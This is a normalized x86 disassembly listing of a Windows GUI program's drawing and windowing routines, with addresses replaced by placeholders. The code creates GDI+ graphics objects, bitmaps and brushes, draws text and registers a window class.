test eax eax
je r-xdata
mov edx [ ebp + 0xc ]
push edx
push ebx
push 0x0
push 0x0
push edi
call [ SetRect@IAT ]
mov eax [ ebp + 0x10 ]
push eax
mov [ esi + 0x4c ] 0x0
call sub_41a930
pop edi
pop ebx
mov ecx [ ebp + 0x10 ]
mov edx esi
call sub_41ae80
pop edi
pop ebx
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_443fba
mov esp ebp
pop ebp
retn 0xc
sub_41a930
push ebp
mov ebp esp
push 0xffffffff
push sub_446138
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ esi + 0x8 ]
push eax
call [ GetDC@IAT ]
mov [ ebp - 0x10 ] eax
test eax eax
jne r-xdata
mov edi [ esi + 0x30 ]
mov ebx [ GdipReleaseDC@IAT ]
test edi edi
je r-xdata
xor al al
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov edi [ esi + 0x34 ]
test edi edi
je r-xdata
mov eax [ esi + 0x10 ]
mov ecx [ edi ]
push eax
push ecx
call ebx
test eax eax
je r-xdata
mov edi [ esi + 0x30 ]
mov ebx [ GdipDeleteGraphics@IAT ]
test edi edi
je r-xdata
mov eax [ esi + 0xc ]
mov edx [ edi ]
push eax
push edx
call ebx
test eax eax
je r-xdata
mov [ edi + 0x4 ] eax
mov edi [ esi + 0x34 ]
test edi edi
je r-xdata
mov eax [ edi ]
push eax
call ebx
push edi
call [ GdipFree@IAT ]
mov [ esi + 0x30 ] 0x0
mov [ edi + 0x4 ] eax
mov ecx [ esi + 0x38 ]
test ecx ecx
je r-xdata
mov ecx [ edi ]
push ecx
call ebx
push edi
call [ GdipFree@IAT ]
mov [ esi + 0x34 ] 0x0
mov ecx [ esi + 0x3c ]
test ecx ecx
je r-xdata
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
mov [ esi + 0x38 ] 0x0
mov eax [ ebp - 0x10 ]
mov ecx [ esi + 0xc ]
lea edx [ esi + 0x18 ]
push edx
push eax
mov edx esi
call sub_41abe0
mov eax [ ebp - 0x10 ]
mov ecx [ esi + 0x10 ]
lea edx [ esi + 0x1c ]
push edx
push eax
mov edx esi
call sub_41abe0
mov ebx [ GdipAlloc@IAT ]
push 0x8
call ebx
mov edi eax
mov [ ebp - 0x18 ] edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
cmp edi ecx
je r-xdata
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
mov [ esi + 0x3c ] 0x0
xor edi edi
mov eax [ esi + 0x10 ]
mov [ ebp - 0x14 ] ecx
lea ecx [ ebp - 0x14 ]
push ecx
push eax
call [ GdipCreateFromHDC@IAT ]
mov edx [ ebp - 0x14 ]
mov [ edi + 0x4 ] eax
mov [ edi ] edx
jmp r-xdata
xor edi edi
mov eax [ esi + 0xc ]
lea ecx [ ebp - 0x14 ]
push ecx
push eax
mov [ ebp - 0x14 ] ebx
call [ GdipCreateFromHDC@IAT ]
mov edx [ ebp - 0x14 ]
mov [ edi + 0x4 ] eax
mov [ edi ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
push 0x8
mov [ esi + 0x30 ] edi
call ebx
mov edi eax
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x4 ] 0x1
xor ebx ebx
cmp edi ebx
je r-xdata
mov ecx [ edi ]
push 0x1
push ecx
call [ GdipSetCompositingQuality@IAT ]
test eax eax
je r-xdata
mov [ edi + 0x4 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ esi + 0x30 ]
mov [ esi + 0x34 ] edi
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] edi
mov edx [ edi ]
push 0x1
push edx
call [ GdipSetSmoothingMode@IAT ]
test eax eax
je r-xdata
mov [ edi + 0x4 ] eax
mov eax [ edi ]
push 0x4
push eax
call [ GdipSetPixelOffsetMode@IAT ]
test eax eax
je r-xdata
mov [ edi + 0x4 ] eax
mov ecx [ edi ]
push 0x5
push ecx
call [ GdipSetInterpolationMode@IAT ]
test eax eax
je r-xdata
mov [ edi + 0x4 ] eax
inc ebx
cmp ebx 0x2
jb r-xdata
mov [ edi + 0x4 ] eax
mov edi [ ebp + ebx * 4 - 0x1c ]
mov eax [ edi ]
push 0x0
push eax
call [ GdipSetCompositingMode@IAT ]
test eax eax
je r-xdata
mov edi [ operator new@IAT ]
push 0x14
call edi
add esp 0x4
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x4 ] 0x2
test eax eax
je r-xdata
xor eax eax
mov edx [ esi + 0x8 ]
mov ecx [ esi + 0x34 ]
mov [ eax + 0x4 ] edx
lea edx [ esi + 0xc ]
mov [ eax + 0x8 ] edx
lea edx [ esi + 0x14 ]
mov [ eax ] r--data
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] edx
jmp r-xdata
xor eax eax
mov ecx [ esi + 0x30 ]
mov edx [ esi + 0x8 ]
mov [ eax + 0x4 ] edx
mov [ eax + 0xc ] ecx
lea edx [ esi + 0x10 ]
lea ecx [ esi + 0x14 ]
mov [ eax ] r--data
mov [ eax + 0x8 ] edx
mov [ eax + 0x10 ] ecx
jmp r-xdata
or ebx 0xffffffff
mov [ ebp - 0x4 ] ebx
push 0x14
mov [ esi + 0x38 ] eax
call edi
add esp 0x4
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x4 ] 0x3
test eax eax
je r-xdata
mov al 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov edx esi
call sub_41ae80
mov [ ebp - 0x4 ] ebx
mov edx [ ebp - 0x10 ]
mov [ esi + 0x3c ] eax
mov eax [ esi + 0x8 ]
push edx
push eax
call [ ReleaseDC@IAT ]
mov ecx [ ebp + 0x8 ]
mov [ esi + 0x4c ] 0x1
test ecx ecx
je r-xdata
sub_41abe0
push ebp
mov ebp esp
push 0xffffffff
push sub_4460f1
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov esi edx
xor ebx ebx
cmp [ ebp + 0xc ] ebx
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
push 0x4
call [ operator new@IAT ]
add esp 0x4
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] ebx
cmp eax ebx
je r-xdata
mov [ ebp - 0x10 ] ebx
mov [ eax ] ebx
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov [ edi ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ esi ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0x1
mov eax [ esi + 0x2c ]
sub eax [ esi + 0x24 ]
mov ecx [ esi + 0x28 ]
sub ecx [ esi + 0x20 ]
push eax
mov eax [ ebp + 0x8 ]
push ecx
push eax
call [ CreateCompatibleBitmap@IAT ]
mov ecx [ ebp - 0x10 ]
mov ebx [ SelectObject@IAT ]
push eax
push edi
mov [ ecx ] eax
call ebx
push 0x1
push edi
call [ SetBkMode@IAT ]
mov edx [ rw-data ]
push edx
push edi
call ebx
mov esi [ esi + 0x44 ]
push esi
push edi
call [ SetTextColor@IAT ]
mov edi [ ebp + 0xc ]
mov esi [ edi ]
test esi esi
je r-xdata
push esi
call [ operator delete@IAT ]
add esp 0x4
mov [ edi ] 0x0
push eax
call [ DeleteObject@IAT ]
test eax eax
je r-xdata
mov [ esi ] 0x0
sub_41ace0
push ebp
mov ebp esp
push 0xffffffff
push sub_4460bf
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] ecx
mov ecx [ ecx + 0x40 ]
mov eax [ rw-data ]
mov eax [ eax + 0x84 ]
cmp ecx 0xffffffff
jne r-xdata
cmp [ eax + 0x1 ] 0x0
je r-xdata
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x8 ]
mov esi [ edx ]
mov [ ebp - 0x4 ] 0x3
mov ebx [ SetBkColor@IAT ]
push ecx
push esi
call ebx
mov edi eax
cmp edi 0xffffffff
je r-xdata
movzx eax cl
mov edx ecx
or eax 0xffffff00
shr edx 0x8
shl eax 0x8
movzx edx dl
shr ecx 0x10
or eax edx
movzx ecx cl
shl eax 0x8
mov ebx r--data
or eax ecx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x1c ] 0x6
xor ecx ecx
mov [ ebp - 0x4 ] ecx
lea edx [ ebp - 0x10 ]
push edx
push eax
mov [ ebp - 0x24 ] r--data
mov [ ebp - 0x10 ] ecx
call [ GdipCreateSolidFill@IAT ]
mov edi [ ebp - 0x10 ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x4 ] 0x1
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
mov esi [ eax + 0x8 ]
mov eax [ eax + 0xc ]
mov [ ebp + 0xc ] ecx
fild [ ebp + 0xc ]
mov [ ebp + 0xc ] edx
sub esi ecx
mov ecx [ ebp + 0x8 ]
fstp [ ebp - 0x10 ]
sub eax edx
fild [ ebp + 0xc ]
mov [ ebp + 0xc ] esi
mov esi [ ecx + 0xc ]
lea edx [ ebp - 0x24 ]
fstp [ ebp - 0x14 ]
push edx
fild [ ebp + 0xc ]
mov [ ebp + 0xc ] eax
lea eax [ ebp - 0x34 ]
fstp [ ebp - 0x18 ]
fild [ ebp + 0xc ]
fstp [ ebp + 0xc ]
fld [ ebp - 0x10 ]
fstp [ ebp - 0x34 ]
fld [ ebp - 0x14 ]
fstp [ ebp - 0x30 ]
fld [ ebp - 0x18 ]
fstp [ ebp - 0x2c ]
fld [ ebp + 0xc ]
fstp [ ebp - 0x28 ]
call sub_41b000
mov [ ebp - 0x4 ] 0xffffffff
push edi
mov [ ebp - 0x24 ] ebx
call [ GdipDeleteBrush@IAT ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ eax + 0x4 ]
cmp ecx 0xffffffff
je r-xdata
mov ecx [ ebp - 0x18 ]
mov eax [ ecx + 0x44 ]
push eax
push esi
call [ SetTextColor@IAT ]
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp + 0xc ]
push 0x0
push 0x0
push 0x0
push eax
push 0x2
push 0x0
push 0x0
push esi
call [ ExtTextOutW@IAT ]
push edi
push esi
call ebx
sub_41ae80
push ebp
mov ebp esp
push 0xffffffff
push sub_4451c0
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov ebx ecx
mov edi edx
test ebx ebx
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ edi + 0xc ] 0x0
je r-xdata
cmp [ edi + 0x4c ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0x0
test bl 0x1
je r-xdata
test bl 0x8
je r-xdata
lea esi [ edi + 0x20 ]
mov eax [ edi ]
push esi
mov ecx [ edi + 0x3c ]
push ecx
mov ecx edi
mov edx [ eax + 0x1c ]
call edx
mov eax [ edi ]
mov ecx [ edi + 0x3c ]
push ecx
mov ecx edi
mov edx [ eax + 0xc ]
call edx
mov eax [ edi + 0x3c ]
push eax
mov edx esi
jmp r-xdata
test bl 0x2
je r-xdata
lea edx [ edi + 0x20 ]
mov ecx [ edi + 0x3c ]
push ecx
mov esi [ edi + 0x38 ]
call sub_422170
test bl 0x4
je r-xdata
mov edx [ edi ]
mov eax [ edi + 0x38 ]
push eax
mov ecx edi
mov edx [ edx + 0x10 ]
call edx
mov eax [ edi ]
mov ecx [ edi + 0x38 ]
push ecx
mov ecx edi
mov edx [ eax + 0x14 ]
call edx
mov [ ebp - 0x4 ] 0xffffffff
push 0x0
lea eax [ edi + 0x20 ]
push eax
mov ecx [ edi + 0x8 ]
push ecx
call [ InvalidateRect@IAT ]
mov edx [ edi + 0x8 ]
push edx
call [ UpdateWindow@IAT ]
sub_41af80
cmp [ esi + 0x4 ] 0x0
je r-xdata
retn
cmp [ esi + 0x4c ] 0x0
je r-xdata
mov ecx [ esi + 0x8 ]
push 0x0
push eax
push ecx
call [ InvalidateRect@IAT ]
mov edx [ esi + 0x8 ]
push edx
call [ UpdateWindow@IAT ]
sub_41afb0
push esi
mov esi eax
cmp [ esi + 0x4 ] 0x0
je r-xdata
pop esi
retn
cmp [ esi + 0x4c ] 0x0
je r-xdata
push edi
mov edi [ esi + 0x38 ]
test edi edi
je r-xdata
pop edi
mov eax [ edx + 0x4 ]
mov esi [ esi + 0x3c ]
mov ecx [ edx ]
mov esi [ esi + 0x8 ]
mov esi [ esi ]
push 0xcc0020
push eax
push ecx
push esi
mov esi [ edx + 0xc ]
mov edx [ edx + 0x8 ]
sub esi eax
push esi
sub edx ecx
push edx
push eax
mov eax [ edi + 0x8 ]
push ecx
mov ecx [ eax ]
push ecx
call [ BitBlt@IAT ]
sub_41b000
push ebp
mov ebp esp
sub esp 0x10
fld [ eax ]
mov edx [ esi ]
fstp [ ebp - 0x10 ]
sub esp 0x10
fld [ eax + 0x4 ]
fstp [ ebp - 0xc ]
fld [ eax + 0x8 ]
fstp [ ebp - 0x8 ]
fld [ eax + 0xc ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
fstp [ ebp - 0x4 ]
fld [ ebp - 0x4 ]
fstp [ esp + 0xc ]
fld [ ebp - 0x8 ]
fstp [ esp + 0x8 ]
fld [ ebp - 0xc ]
fstp [ esp + 0x4 ]
fld [ ebp - 0x10 ]
fstp [ esp ]
push ecx
push edx
call [ GdipFillRectangle@IAT ]
test eax eax
je r-xdata
xor eax eax
mov esp ebp
pop ebp
retn 0x4
mov [ esi + 0x4 ] eax
mov esp ebp
pop ebp
retn 0x4
sub_41b060
push ebp
mov ebp esp
push 0xffffffff
push sub_444bf8
mov eax [ fs : 0x0 ]
push eax
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xffffffff
mov [ eax ] r--data
mov eax [ eax + 0x4 ]
push eax
call [ GdipDeleteBrush@IAT ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x4
sub_41b0d0
push ebp
mov ebp esp
push 0xffffffff
push sub_445198
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ esi + 0x4 ]
push eax
mov [ esi ] r--data
call [ GdipDeleteBrush@IAT ]
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call [ GdipFree@IAT ]
sub_41b140
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
push eax
mov [ esi ] r--data
call [ GdipDeleteBrush@IAT ]
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call [ GdipFree@IAT ]
sub_41b170
push ebp
mov ebp esp
push 0xffffffff
push sub_4456b8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov ecx [ esi + 0x4 ]
lea eax [ ebp - 0x10 ]
push eax
push ecx
mov [ ebp - 0x10 ] 0x0
call [ GdipCloneBrush@IAT ]
test eax eax
je r-xdata
push 0xc
call [ GdipAlloc@IAT ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
mov [ esi + 0x8 ] eax
xor esi esi
mov esi [ esi + 0x8 ]
mov ecx [ ebp - 0x10 ]
mov [ eax + 0x8 ] esi
mov [ eax ] r--data
mov [ eax + 0x4 ] ecx
mov esi eax
jmp r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x10 ]
push edx
call [ GdipDeleteBrush@IAT ]
mov [ ebp - 0x4 ] 0xffffffff
test esi esi
jne r-xdata
sub_41b210
push ebp
mov ebp esp
push 0xffffffff
push sub_445e98
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x0
mov ecx [ esi + 0x4 ]
lea eax [ esi + 0x8 ]
push eax
push ecx
call [ EndPaint@IAT ]
mov [ esi ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ esi ]
test eax eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push eax
mov [ esi ] 0x0
call [ DeleteDC@IAT ]
sub_41b2c0
push ebp
mov ebp esp
push 0xffffffff
push sub_444bc8
mov eax [ fs : 0x0 ]
push eax
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ esi ]
xor edi edi
cmp eax edi
je r-xdata
mov [ esi + 0x8 ] edi
mov [ esi + 0x4 ] edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
push eax
call [ free@IAT ]
add esp 0x4
mov [ esi ] edi
sub_41b320
push ebp
mov ebp esp
sub esp 0x8
cmp [ edi + 0xe0 ] 0x0
jne r-xdata
push ebx
push esi
lea ecx [ edi + 0xb0 ]
lea ebx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x4 ] 0x5
call sub_414260
mov eax [ ebp - 0x8 ]
cmp eax [ edi + 0xb4 ]
je r-xdata
xor eax eax
mov esp ebp
pop ebp
retn
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ eax + 0x10 ]
test esi esi
je r-xdata
mov ecx [ esi + 0x14 ]
mov eax [ esi ]
mov edx [ eax + 0xc ]
push ecx
mov ecx esi
call edx
mov eax [ esi + 0xc ]
cdq
idiv [ edi + 0xe0 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41b390
push ebp
mov ebp esp
push 0xffffffff
push sub_446083
mov eax [ fs : 0x0 ]
push eax
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
xor ebx ebx
mov [ esi ] ebx
mov [ ebp - 0x4 ] ebx
mov [ esi + 0x4 ] ecx
mov [ esi + 0x18 ] ebx
mov [ ebp - 0x4 ] 0x1
mov [ esi + 0x1c ] ebx
mov edx [ eax ]
mov [ esi + 0x8 ] edx
mov ecx [ eax + 0x4 ]
mov [ esi + 0xc ] ecx
mov edx [ eax + 0x8 ]
mov [ esi + 0x10 ] edx
mov eax [ eax + 0xc ]
mov [ esi + 0x14 ] eax
mov eax [ esi + 0x4 ]
push eax
call [ CreateCompatibleDC@IAT ]
mov edx [ esi + 0x4 ]
mov [ esi ] eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
mov ecx [ edi + 0x8 ]
sub ecx [ edi ]
push eax
push ecx
push edx
call [ CreateCompatibleBitmap@IAT ]
mov [ esi + 0x18 ] eax
mov ecx [ esi ]
push eax
push ecx
call [ SelectObject@IAT ]
mov [ esi + 0x1c ] eax
mov [ esi + 0x20 ] bl
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_41b440
cmp [ esi + 0x20 ] 0x0
jne r-xdata
retn
mov eax [ esi + 0xc ]
mov ecx [ esi + 0x8 ]
mov edx [ esi ]
push 0xcc0020
push eax
push ecx
push edx
mov edx [ esi + 0x14 ]
sub edx eax
push edx
mov edx [ esi + 0x10 ]
sub edx ecx
push edx
push eax
mov eax [ esi + 0x4 ]
push ecx
push eax
mov [ esi + 0x20 ] 0x1
call [ BitBlt@IAT ]
mov ecx [ esi + 0x1c ]
mov edx [ esi ]
push ecx
push edx
call [ SelectObject@IAT ]
sub_41b480
push ebp
mov ebp esp
push 0xffffffff
push sub_446053
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov eax 0x1
mov [ ebp - 0x4 ] eax
cmp [ esi + 0x20 ] 0x0
jne r-xdata
mov [ ebp - 0x4 ] 0x0
mov eax [ esi + 0x18 ]
test eax eax
je r-xdata
mov ecx [ esi + 0x8 ]
mov edx [ esi ]
push 0xcc0020
mov [ esi + 0x20 ] al
mov eax [ esi + 0xc ]
push eax
push ecx
push edx
mov edx [ esi + 0x14 ]
sub edx eax
push edx
mov edx [ esi + 0x10 ]
sub edx ecx
push edx
push eax
mov eax [ esi + 0x4 ]
push ecx
push eax
call [ BitBlt@IAT ]
mov eax [ esi + 0x1c ]
mov ecx [ esi ]
push eax
push ecx
call [ SelectObject@IAT ]
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ esi ]
test eax eax
je r-xdata
push eax
call [ DeleteObject@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push eax
mov [ esi ] 0x0
call [ DeleteDC@IAT ]
mov [ esi + 0x18 ] 0x0
sub_41b540
push ebp
mov ebp esp
sub esp 0x34
push esi
push 0x2c
xor esi esi
lea eax [ ebp - 0x2c ]
push esi
push eax
call memset
mov ecx [ rw-data ]
add esp 0xc
push 0x7f00
push esi
mov [ ebp - 0x30 ] 0x30
mov [ ebp - 0x2c ] 0x3
mov [ ebp - 0x28 ] sub_41b5b0
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x18 ] esi
call [ LoadCursorW@IAT ]
lea edx [ ebp - 0x30 ]
push edx
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] esi
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] r--data
call [ RegisterClassExW@IAT ]
pop esi
mov esp ebp
pop ebp
retn
sub_41b5b0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x64
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x60 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0xc ]
lea eax [ edi - 0x200 ]
cmp eax 0xe
ja r-xdata
mov eax edi
sub eax 0x2
je r-xdata
push 0x5
push esi
call [ GetWindow@IAT ]
mov esi eax
test esi esi
je r-xdata
push 0x5
push esi
call [ GetWindow@IAT ]
test eax eax
je r-xdata
sub eax 0xd
je r-xdata
mov ecx [ esp + 0x6c ]
pop edi
pop esi
pop ebx
xor ecx esp
mov eax 0x1
call sub_443fba
mov esp ebp
pop ebp
retn 0x10
lea ecx [ esp + 0x18 ]
push ecx
push esi
call [ GetWindowRect@IAT ]
mov eax [ ebp + 0x14 ]
movsx ecx ax
shr eax 0x10
cwde
push eax
push ecx
lea edx [ esp + 0x20 ]
push edx
mov [ esp + 0x1c ] ecx
mov [ esp + 0x20 ] eax
call [ PtInRect@IAT ]
test eax eax
je r-xdata
push 0x0
push eax
call [ SetParent@IAT ]
lea eax [ esp + 0x28 ]
push eax
push esi
call [ BeginPaint@IAT ]
push 0x5
push esi
mov edi eax
call [ GetWindow@IAT ]
push r--data
push esi
mov ebx eax
call [ GetPropA@IAT ]
push eax
push edi
call [ SetBkColor@IAT ]
push 0x0
push 0x0
push 0x0
lea ecx [ esp + 0x3c ]
push ecx
push 0x2
push 0x0
push 0x0
push edi
call [ ExtTextOutW@IAT ]
test ebx ebx
je r-xdata
sub eax 0x5
je r-xdata
lea eax [ esp + 0x10 ]
push eax
push esi
call [ ScreenToClient@IAT ]
movzx ecx [ esp + 0x14 ]
movzx edx [ esp + 0x10 ]
mov eax [ ebp + 0x10 ]
shl ecx 0x10
or ecx edx
push ecx
push eax
push edi
push esi
call [ SendMessageW@IAT ]
jmp r-xdata
lea edx [ esp + 0x28 ]
push edx
push esi
call [ EndPaint@IAT ]
xor eax eax
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x60 ]
xor ecx esp
call sub_443fba
mov esp ebp
pop ebp
retn 0x10
push 0x1
push 0x0
push ebx
call [ InvalidateRect@IAT ]
push ebx
call [ UpdateWindow@IAT ]
mov ecx [ ebp + 0x14 ]
mov edx [ ebp + 0x10 ]
push ecx
push edx
push edi
push esi
call [ DefWindowProcW@IAT ]
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x60 ]
xor ecx esp
call sub_443fba
mov esp ebp
pop ebp
retn 0x10
sub_41b740
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x15 ] 0x1
test eax eax
jne r-xdata
push eax
push esi
call [ SelectObject@IAT ]
mov ecx [ ebp - 0x1c ]
mov [ ebp - 0x24 ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x7d0
mov [ ebp - 0x8 ] 0x3e8
cmp [ ecx ] al
jne r-xdata
push 0x11
call [ GetStockObject@IAT ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] eax
push 0x650
lea eax [ ebp - 0x14 ]
push eax
push edi
mov [ ebp - 0xc ] 0x7d0
mov [ ebp - 0x8 ] 0x3e8
call [ lstrlenW@IAT ]
push eax
push edi
push esi
call [ DrawTextW@IAT ]
mov ecx [ ebp - 0xc ]
sub ecx [ ebp - 0x14 ]
mov [ ebp - 0x20 ] eax
cmp ecx 0x7d0
jle r-xdata
push 0x640
lea edx [ ebp - 0x14 ]
push edx
push edi
call [ lstrlenW@IAT ]
push eax
push edi
push esi
call [ DrawTextW@IAT ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x14 ]
cmp eax 0x7d0
jle r-xdata
mov edx [ ebp - 0x24 ]
push edx
push esi
call [ SelectObject@IAT ]
mov ecx [ ebp - 0x20 ]
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x14 ]
mov [ ebx + 0xc ] ecx
mov ecx [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
mov al [ ebp - 0x15 ]
xor ecx ebp
mov [ ebx ] 0x0
mov [ ebx + 0x4 ] 0x0
call sub_443fba
mov esp ebp
pop ebp
retn 0x8
mov [ ebp - 0x15 ] 0x0
mov edx [ ebp - 0x1c ]
cmp [ edx ] 0x0
je r-xdata
mov ecx [ ebp - 0x1c ]
mov [ ecx ] 0x1
jmp r-xdata
xor eax eax
sub_41b850
push ebp
mov ebp esp
push 0xffffffff
push sub_447e22
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
xor ebx ebx
mov [ esi ] r--data
mov [ esi + 0x10 ] ebx
mov [ ebp - 0x4 ] ebx
lea eax [ esi + 0x1c ]
mov [ ebp - 0x10 ] eax
mov [ eax ] ebx
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ebx
mov [ ebp - 0x4 ] 0x2
lea edi [ esi + 0x28 ]
push 0x1
mov [ ebp - 0x10 ] edi
mov [ edi + 0x8 ] ebx
call sub_41ef40
mov [ edi + 0x4 ] eax
mov [ eax ] eax
mov eax [ edi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ edi + 0x4 ]
mov [ eax + 0x8 ] eax
mov eax [ edi + 0x4 ]
mov [ eax + 0x18 ] 0x1
